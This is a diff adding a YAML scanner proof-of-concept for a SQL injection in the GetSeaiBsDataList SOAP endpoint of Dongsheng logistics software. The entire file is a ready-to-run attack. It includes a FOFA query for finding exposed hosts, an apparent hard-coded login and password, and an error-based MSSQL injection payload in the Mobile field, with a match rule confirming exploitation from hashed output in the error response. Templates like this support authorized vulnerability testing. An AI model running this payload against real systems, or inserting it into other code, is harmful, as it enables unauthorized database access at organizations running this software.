@@ -1,0 +1,28 @@
+id: poc-yaml-dongshengsoft-getseaibsdatalist-sqli
+info:
+  name: 东胜物流软件 GetSeaiBsDataList SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 东胜物流软件
+  fofa: app="东胜物流软件-物流软件"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /Webservice/DsWebService.asmx
+  headers:
+    Content-Type: application/soap+xml;charset=UTF-8;action="DsWebService/GetSeaiBsDataList"
+  data: "<soap:Envelope xmlns:soap=\"http://www.w3.org/2003/05/soap-envelope\" xmlns:dsw=\"\
+    DsWebService\">\n   <soap:Header/>\n   <soap:Body>\n      <dsw:GetSeaiBsDataList>\n\
+    \         <!--Optional:-->\n         <dsw:LoginName>qdtaize</dsw:LoginName>\n\
+    \         <!--Optional:-->\n         <dsw:LoginPass>EBBE3242-D49E-4398-BBFE-0133CA655EB5</dsw:LoginPass>\n\
+    \         <!--Optional:-->\n         <dsw:Mobile>1')or 1&lt;sys.fn_varbintohexstr(hashbytes('MD5','{{.t1}}'))--</dsw:Mobile>\n\
+    \         <!--Optional:-->\n         <dsw:Mblno>1</dsw:Mblno>\n         <dsw:start>1</dsw:start>\n\
+    \         <dsw:limit>1</dsw:limit>\n      </dsw:GetSeaiBsDataList>\n   </soap:Body>\n\
+    </soap:Envelope>"
+  expression: status_code == 500 && contains(body,"0x" + t2) && contains(body,"SqlException")
+    && contains(content_type,"application/soap+xml") && matches(body,"转换成数据类型(.*?)时失败")
+    && matches(body,"在将(.*?)值")
+transport: http
